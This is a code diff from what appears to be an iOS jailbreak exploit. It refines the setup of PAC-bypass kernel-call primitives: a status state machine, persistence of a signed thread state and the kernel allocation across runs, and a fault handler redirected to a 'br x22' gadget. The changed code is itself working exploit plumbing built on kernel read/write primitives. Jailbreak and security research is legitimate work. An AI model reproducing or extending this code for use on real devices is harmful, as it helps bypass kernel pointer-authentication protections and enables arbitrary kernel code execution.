@@ -36,7 +36,6 @@ typedef struct {
 } exploitThreadInfo;
 
 typedef struct {
-    bool inited;
     thread_t thread;
     uint64_t actContext;
     kRegisterState signedState;
@@ -159,19 +158,17 @@ uint64_t Fugu14Kcall_onThread(Fugu14KcallThread *callThread, uint64_t func, uint
 
 uint64_t kcall(uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8)
 {
-	if (gFugu14KcallThread.inited)
-	{
-		return Fugu14Kcall_onThread(&gFugu14KcallThread, func, a1, a2, a3, a4, a5, a6, a7, a8);
-	}
-	return 0;
+	if (gPACStatus != kPACStatusFinalized) return 0;
+	return Fugu14Kcall_onThread(&gFugu14KcallThread, func, a1, a2, a3, a4, a5, a6, a7, a8);
 }
 
 uint64_t initPACPrimitives(uint64_t kernelAllocation)
 {
-	//TODO: Map in kernel allocation to local process
-	// then run all code from setupFugu14Kcall until ml_sign_thread_state call
-	// return the arcContext pointer back to the caller
-	// caller then signs the context and calls initPACPrimitivesStep2
+    if (gPACStatus != kPACStatusNotInitialized || kernelAllocation == 0) {
+        return 0;
+    }
+
+    bootInfo_setObject(@"pac_kernel_allocation", @(kernelAllocation));
 
 	thread_t thread = 0;
     kern_return_t kr = thread_create(mach_task_self_, &thread);
@@ -238,11 +235,17 @@ uint64_t initPACPrimitives(uint64_t kernelAllocation)
     gFugu14KcallThread.actContext          = actContext;
     gFugu14KcallThread.scratchMemoryMapped = (uint64_t*) ((uintptr_t)gThreadMapStart + 0xF000ULL);
 
+    gPACStatus = kPACStatusPrepared;
+
 	return actContext;
 }
 
 void finalizePACPrimitives(void)
 {
+    if (gPACStatus != kPACStatusPrepared) {
+        return;
+    }
+
 	// When this is called, we except actContext to be signed,
 	//  so we can continue to finish setting up the kcall thread
 
@@ -253,6 +256,10 @@ void finalizePACPrimitives(void)
 
 	// Create a copy of signed state
     kreadbuf(actContext, &gFugu14KcallThread.signedState, sizeof(kRegisterState));
+
+    // Save signed state for later generations
+    NSData *signedStateData = [NSData dataWithBytes:&gFugu14KcallThread.signedState length:sizeof(kRegisterState)];
+    bootInfo_setObject(@"pac_signed_state", signedStateData);
 
 	// Set a custom recovery handler
     uint64_t hw_lck_ticket_reserve_orig_allow_invalid = bootInfo_getSlidUInt64(@"hw_lck_ticket_reserve_orig_allow_invalid") + 4;
@@ -294,12 +301,30 @@ void finalizePACPrimitives(void)
     
     // Done!
     // Thread's fault handler is now set to the br x22 gadget
-    gFugu14KcallThread.inited = true;
+    gPACStatus = kPACStatusFinalized;
+
+    PACInitializedCallback();
 }
+
+/*void recoverPACPrimitivesIfPossible(void)
+{
+    if (gPPLStatus != kPPLStatusInitialized) return;
+
+    uint64_t kernelAllocation = bootInfo_getUInt64(@"pac_kernel_allocation");
+    NSData *kernelSignedState = bootInfo_getData(@"pac_signed_state");
+
+    // Quit if not recoverable
+    if (!kernelAllocation || !kernelSignedState) return;
+
+    uint64_t actContextKptr = initPACPrimitives(kernelAllocation);
+    kwritebuf(actContextKptr, kernelSignedState.bytes, kernelSignedState.length);
+
+    finalizePACPrimitives();
+}*/
 
 void destroyPACPrimitives(void)
 {
-	//TODO
+	// TODO
 }
 
 // UTILS
